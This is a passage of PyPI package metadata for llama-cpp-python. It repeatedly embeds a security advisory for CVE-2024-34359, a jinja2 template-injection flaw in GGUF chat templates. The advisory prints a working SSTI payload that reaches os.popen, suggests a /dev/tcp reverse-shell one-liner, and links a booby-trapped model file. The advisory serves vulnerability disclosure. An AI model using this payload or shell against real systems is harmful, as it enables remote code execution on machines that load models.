`llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.45":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.45/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.45","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"7acb3e958c169fabb2df7ffaeb170a5d2b2cc8370ff31621e23b778ebcd8ab24","md5":"326223ad0770b5bd0ac9cda78a32eab5","sha256":"9607d25106573a9c62e54fee8e55297daf14ff135c585ba4a8c4871057c2e011"},"downloads":-1,"filename":"llama_cpp_python-0.2.45.tar.gz","has_sig":false,"md5_digest":"326223ad0770b5bd0ac9cda78a32eab5","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36679474,"upload_time":"2024-02-21T16:12:19","upload_time_iso_8601":"2024-02-21T16:12:19.127124Z","url":"https://files.pythonhosted.org/packages/7a/cb/3e958c169fabb2df7ffaeb170a5d2b2cc8370ff31621e23b778ebcd8ab24/llama_cpp_python-0.2.45.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.46":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.46/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.46","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"25b01df28f6ec4d14432dddc56e04bb05c0e78c40bc5611c1a54132fe2244d1a","md5":"512828d531ecbac8c47482f249b2facd","sha256":"2e627da51ead7b56d61e2f6cf6c4a25bef7982f56d00a74506faf93dae191a00"},"downloads":-1,"filename":"llama_cpp_python-0.2.46.tar.gz","has_sig":false,"md5_digest":"512828d531ecbac8c47482f249b2facd","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":36677312,"upload_time":"2024-02-21T21:33:20","upload_time_iso_8601":"2024-02-21T21:33:20.343755Z","url":"https://files.pythonhosted.org/packages/25/b0/1df28f6ec4d14432dddc56e04bb05c0e78c40bc5611c1a54132fe2244d1a/llama_cpp_python-0.2.46.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> 